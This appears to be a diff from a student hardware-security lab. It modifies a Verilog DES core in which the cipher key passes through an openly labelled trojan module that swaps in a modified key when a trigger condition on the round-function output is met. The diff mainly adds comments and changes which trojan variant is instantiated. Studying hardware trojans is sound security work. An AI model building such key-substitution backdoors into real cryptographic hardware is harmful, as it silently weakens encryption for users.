@@ -2,8 +2,10 @@
 //Experiement 4 Part 2
 //9/17/21
 
-//This des.v calls the trojan.v file to determine if the trigger condition is met
-// it will send the pay load. The added lines of code is commented below.
+// This des.v calls the trojan_X.v file to determine if the trigger condition is met.
+// If the trigger condition from the F function is met it will send the pay load (modified key).
+// Other wise the input key will be used. The added lines of code is commented below.
+// To instantiate a different trojan trigger condition change the module name on line 135
 
 
 /////////////////////////////////////////////////////////////////////
@@ -70,7 +72,7 @@ module des(clk_in, rst);
 	wire [55:0] key56;
 	reg [3:0] cnt;
 	wire clk;
-	wire [1:4] triggerstatus;
+	wire [1:4] triggerstatus; // debugging
 	
 	divi Uclk(.clk(clk_in), .clkout(clk));
 	
@@ -91,7 +93,7 @@ module des(clk_in, rst);
 	.address({1'b0,cnt[3:0]}),
 	.clock(clk),
 	.data(desout),
-	//.data(triggerstatus),
+		//.data(triggerstatus),	//Debugging
 	.wren(1'b1),
 	.q());
 	
@@ -106,6 +108,7 @@ endmodule
 
 module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	output	[63:0]	desOut;
+	output 	[1:4] 	triggerstatus; // debugging
 	input	[63:0]	desIn;
 	input	[55:0]	key;
 	input		decrypt;
@@ -119,7 +122,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	wire	[1:32]	Lout, Rout;
 	wire	[1:32]	out;
     wire    [55:0]  key_troj; // used to send payload
-	 output [1:4] triggerstatus;
+	 
 
 	assign Lout = (roundSel == 0) ? IP[33:64] : R;
 	assign Xin  = (roundSel == 0) ? IP[01:32] : L;
@@ -127,8 +130,10 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
-	assign triggerstatus = out[29:32];
-    trojan_15 u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
+	
+	assign triggerstatus = out[29:32];				// used for debugging and to determine how many time the payload gets triggered
+	trojan_0 u2( .payload(key_troj), .key(key), .trigger(out) ); 	// Change module name here e.g change "trojan_0" to "trojan_15" or "trojan_5"
+									// calls trojan_X.v to determine if tigger condition is met and uses key_troj as payload
 
 	always @(posedge clk)
 			  L <= #1 Lout;
@@ -139,7 +144,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	// Select a subkey from key.
 	key_sel u1(
 		.K_sub(		K_sub		),
-		.K(		key_troj		), // uses the payload varibalbe to control the cyipher key.
+		.K(		key_troj		), // uses the payload variable to control the cyipher key.
 		.roundSel(	roundSel	),
 		.decrypt(	decrypt		)
 		);
